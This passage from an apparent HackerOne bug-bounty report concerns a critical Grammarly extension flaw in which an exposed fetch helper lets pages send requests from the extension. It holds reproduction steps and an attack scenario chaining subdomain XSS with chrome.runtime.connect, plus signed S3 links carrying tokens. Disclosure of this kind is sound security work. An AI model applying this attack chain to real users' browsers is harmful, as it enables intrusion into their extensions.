vxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=faea3bbb0d657178f69b74d3b502418b36d62ac1f699775c04c174dd39b4ff11","file_size":1628434,"type":"video/mp4"},{"id":327036,"file_name":"app-grammarly-csfr.html","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/327/036/3e603eb3104e711215f08184bf72c7cd184c048a/app-grammarly-csfr.html?response-content-disposition=attachment%3B%20filename%3D%22app-grammarly-csfr.html%22%3B%20filename%2A%3DUTF-8%27%27app-grammarly-csfr.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054853Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=59cee2fc95bda27ee1754569debd7106fe37512407413bc3c1c6f461d9b26bd3","file_size":1039,"type":"text/html"},{"id":327037,"file_name":"get-request-to-gmail.html","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/327/037/50ce0ebc9c51f2be2c7914fd304f72431c56377a/get-request-to-gmail.html?response-content-disposition=attachment%3B%20filename%3D%22get-request-to-gmail.html%22%3B%20filename%2A%3DUTF-8%27%27get-request-to-gmail.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054853Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=7cd57da83fdf367af06dcd75de85929ae1dd1fdd8f5f5c42b7830fa2ff18efed","file_size":717,"type":"text/html"}],"allow_singular_disclosure_at":"2019-08-26T17:33:33.931Z","allow_singular_disclosure_after":-42380119.79644347,"singular_disclosure_allowed":true,"vote_count":187,"voters":["daehee","sultancad","dee-see","d0xing","kapytein","secator","z3t","michiel","mashoud1122","muon4","and 177 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":3577,"asset_type":"OTHER","asset_identifier":"Browser Extensions","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3124342,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Typo: `File/Blob/FileList` **clonnable** objects","markdown_message":"\u003cp\u003eTypo: \u003ccode\u003eFile/Blob/FileList\u003c/code\u003e \u003cstrong\u003eclonnable\u003c/strong\u003e objects\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-01T01:13:42.832Z","updated_at":"2018-08-01T01:13:42.832Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3124838,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"**UPD:** it's possible to disclose Grammarly extension id in a browser using `gnar._fetch()`:\n1. Run `server.js` (`npm i serve-handler \u0026\u0026 node server.js`) \n2. Open `http://localhost:5000/to-localhost.html` (assuming both files are in the same dir)\n3. Server logs headers for `http://localhost:5000/detect-id` requests\n4. Find `origin: 'chrome-extension://\u003cid\u003e'` in process output\n\nNeed some time to investigate this issue deeper. Maybe it's possible to escalate this bug to full RCE.\n\n\u003e Note that requests made using `gnar._fetch` includes \"Origin\" header.","markdown_message":"\u003cp\u003e\u003cstrong\u003eUPD:\u003c/strong\u003e it\u0026#39;s possible to disclose Grammarly extension id in a browser using \u003ccode\u003egnar._fetch()\u003c/code\u003e:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eRun \u003ccode\u003eserver.js\u003c/code\u003e (\u003ccode\u003enpm i serve-handler \u0026amp;\u0026amp; node server.js\u003c/code\u003e) \u003c/li\u003e\n\u003cli\u003eOpen \u003ccode\u003ehttp://localhost:5000/to-localhost.html\u003c/code\u003e (assuming both files are in the same dir)\u003c/li\u003e\n\u003cli\u003eServer logs headers for \u003ccode\u003ehttp://localhost:5000/detect-id\u003c/code\u003e requests\u003c/li\u003e\n\u003cli\u003eFind \u003ccode\u003eorigin: \u0026#39;chrome-extension://\u0026lt;id\u0026gt;\u0026#39;\u003c/code\u003e in process output\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eNeed some time to investigate this issue deeper. Maybe it\u0026#39;s possible to escalate this bug to full RCE.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eNote that requests made using \u003ccode\u003egnar._fetch\u003c/code\u003e includes \u0026quot;Origin\u0026quot; header.\u003c/p\u003e\n\u003c/blockquote\u003e\n","automated_response":false,"created_at":"2018-08-01T06:39:29.813Z","updated_at":"2018-08-01T06:45:31.487Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":327105,"filename":"server.js","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/327/105/bb20c3a5428d55ddabd07650a13750a2caa1eb89/server.js?response-content-disposition=attachment%3B%20filename%3D%22server.js%22%3B%20filename%2A%3DUTF-8%27%27server.js\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054853Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=abe4a3890dd3e26a37b3f5eeea50a5d72b2dcc7fa1a926bd58f892ed89596595"},{"id":327104,"filename":"to-localhost.html","type":"text/html","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/327/104/b9c7710672a643f79cb6b87ff2a190b21b357226/to-localhost.html?response-content-disposition=attachment%3B%20filename%3D%22to-localhost.html%22%3B%20filename%2A%3DUTF-8%27%27to-localhost.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054853Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=d4adc3a52b6af95eab8f9dd72aeed2ba71397200e43f5f18b82d4b1b3d3302da"}],"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3124915,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"### Attack Scenario\n\n\u003e [3-5 steps are only theoretical currently]\n\nI've got an assumption about the attack scenario that could lead to RCE. However, it has one requirement:\n\n1. User visits attacker's page\n2. Page triggers XHR from background page to attacker's server and discloses extension's id\n3. [Assumption] #389076 or `window.open` could be triggered to open a page on `*://*.grammarly.com` URL. Grammarly has some domains those aren't listed on hackerone and could be vulnerable. XSS on \"unprotected\" `*.grammarly.com` domain is enough to trigger step 4.\n4. Page at `*://*.grammarly.com` vulnerable to XSS calls `chrome.runtime.connect` with extension id from step 2.\n5. Result: attacker has a page connected to Grammarly's background page and could send own commands to Grammarly extension.","markdown_message":"\u003ch3 id=\"attack-scenario\"\u003eAttack Scenario\u003c/h3\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e[3-5 steps are only theoretical currently]\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI\u0026#39;ve got an assumption about the attack scenario that could lead to RCE. However, it has one requirement:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eUser visits attacker\u0026#39;s page\u003c/li\u003e\n\u003cli\u003ePage triggers XHR from background page to attacker\u0026#39;s server and discloses extension\u0026#39;s id\u003c/li\u003e\n\u003cli\u003e[Assumption] \u003ca href=\"/reports/389076\"\u003e#389076\u003c/a\u003e or \u003ccode\u003ewindow.open\u003c/code\u003e could be triggered to open a page on \u003ccode\u003e*://*.grammarly.com\u003c/code\u003e URL. Grammarly has some domains those aren\u0026#39;t listed on hackerone and could be vulnerable. XSS on \u0026quot;unprotected\u0026quot; \u003ccode\u003e*.grammarly.com\u003c/code\u003e domain is enough to trigger step 4.\u003c/li\u003e\n\u003cli\u003ePage at \u003ccode\u003e*://*.grammarly.com\u003c/code\u003e vulnerable to XSS calls \u003ccode\u003echrome.runtime.connect\u003c/code\u003e with extension id from step 2.\u003c/li\u003e\n\u003cli\u003eResult: attacker has a page connected to Grammarly\u0026#39;s background page and could send own commands to Grammarly extension.\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2018-08-01T07:37:08.070Z","updated_at":"2018-08-01T07:48:58.973Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3130408,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"## Firefox\n\nI was able to repro this with Grammarly for Firefox 8.828.1757 on 63.0a1 (2018-07-31) Mozilla Nightly\n","markdown_message":"\u003ch2 id=\"firefox\"\u003eFirefox\u003c/h2\u003e\n\n\u003cp\u003eI was able to repro this with Grammarly for Firefox 8.828.1757 on 63.0a1 (2018-07-31) Mozilla Nightly\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-01T21:36:06.151Z","updated_at":"2018-08-01T21:36:06.151Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3131711,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @metnew,\n\nThanks for your submission. We are currently reviewing your report and will get back to you once we have additional information to share.\n\nKind regards,\n@chessmast3r ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/metnew\"\u003e@metnew\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for your submission. We are currently reviewing your report and will get back to you once we have additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/chessmast3r\"\u003e@chessmast3r\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-02T08:54:42.629Z","updated_at":"2018-08-02T08:54:42.629Z","actor":{"username":"chessmast3r","cleared":false,"url":"/chessmast3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/459/6b3c5fca9df9cde7fe36b55238b13d2cea86ea80_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3139501,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"#### Schema modifying\n\u003e Theoretically: Object schema modification is possible when sending an object from the page to content script. Maybe object with modified schema could be sent to background page too.\n\n\u003e Probably it's possible to change `Object.prototype.apply` to something that attacker wants and sent to background page + bypass `JSON.stringify` with additional getters/setters/property config. I'll check this attack vector too.","markdown_message":"\u003ch4 id=\"schema-modifying\"\u003eSchema modifying\u003c/h4\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eTheoretically: Object schema modification is possible when sending an object from the page to content script. Maybe object with modified schema could be sent to background page too.\u003c/p\u003e\n\n\u003cp\u003eProbably it\u0026#39;s possible to change \u003ccode\u003eObject.prototype.apply\u003c/code\u003e to something that attacker wants and sent to background page + bypass \u003ccode\u003eJSON.stringify\u003c/code\u003e with additional getters/setters/property config. I\u0026#39;ll check this attack vector too.\u003c/p\u003e\n\u003c/blockquote\u003e\n","automated_response":false,"created_at":"2018-08-04T03:11:50.837Z","updated_at":"2018-08-04T03:11:50.837Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3141566,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, I forgot that the extension's `id` is static and assigned by Chrome marketplace. I'll submit another report if a page could connect to background page from `*.grammarly.com`. ","markdown_message":"\u003cp\u003eSorry, I forgot that the extension\u0026#39;s \u003ccode\u003eid\u003c/code\u003e is static and assigned by Chrome marketplace. I\u0026#39;ll submit another report if a page could connect to background page from \u003ccode\u003e*.grammarly.com\u003c/code\u003e. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-04T22:12:21.428Z","updated_at":"2018-08-04T22:12:21.428Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3154461,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @metnew,\n\nThanks for your submission! This appears to be reproducible, but we need to check further with the product team to see if this is an issue they intend to fix. If not, it's possible this issue will be closed accordingly. We are still marking as triaged to indicate we've processed your issue and are looking into it further. Thanks for your patience.\n\nBest regards,\n@chessmast3r ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/metnew\"\u003e@metnew\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for your submission! This appears to be reproducible, but we need to check further with the product team to see if this is an issue they intend to fix. If not, it\u0026#39;s possible this issue will be closed accordingly. We are still marking as triaged to indicate we\u0026#39;ve processed your issue and are looking into it further. Thanks for your patience.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\n\u003ca href=\"/chessmast3r\"\u003e@chessmast3r\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-07T09:23:06.988Z","updated_at":"2018-08-07T09:23:06.988Z","actor":{"username":"chessmast3r","cleared":false,"url":"/chessmast3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/459/6b3c5fca9df9cde7fe36b55238b13d2cea86ea80_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3155756,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@chessmast3r I don't understand why this issue could be closed. The patch is easy - just remove `_fetch` from the `p.tracker.gnar` object -\u003e attacker can't call `fetch` from the extension with own args.","markdown_message":"\u003cp\u003e\u003ca href=\"/chessmast3r\"\u003e@chessmast3r\u003c/a\u003e I don\u0026#39;t understand why this issue could be closed. The patch is easy - just remove \u003ccode\u003e_fetch\u003c/code\u003e from the \u003ccode\u003ep.tracker.gnar\u003c/code\u003e object -\u0026gt; attacker can\u0026#39;t call \u003ccode\u003efetch\u003c/code\u003e from the extension with own args.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-07T15:08:00.611Z","updated_at":"2018-08-07T15:08:00.611Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grammarly","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3159426,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"@metnew, we do appreciate your efforts and the time you invested into our extension code which allowed you to discover this critical vulnerability. We're doubling the bonus as the extension is our focus area and we would appreciate your further help and closer cooperation on extension vulnerability testing.","markdown_message":"\u003cp\u003e\u003ca href=\"/metnew\"\u003e@metnew\u003c/a\u003e, we do appreciate your efforts and the time you invested into our extension code which allowed you to discover this critical vulnerability. We\u0026#39;re doubling the bonus as the extension is our focus area and we would appreciate your further help and closer cooperation on extension vulnerability testing.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-08T09:12:04.208Z","updated_at":"2018-08-08T09:12:04.208Z","actor":{"url":"/grammarly","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/746/a2bf7f90c683af5214fcc74c1df6804286ee97ce_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Grammarly"}},"bounty_amount":"1400.0","bounty_currency":"usd","bonus_amount":"1600.0","genius_execution_id":null,"team_handle":"grammarly","collaborator":{"username":"metnew","url":"/metnew"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3159430,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@metnew This is now closed and released per my records. Please, validate at your end","markdown_message":"\u003cp\u003e\u003ca href=\"/metnew\"\u003e@metnew\u003c/a\u003e This is now closed and released per my records. Please, validate at your 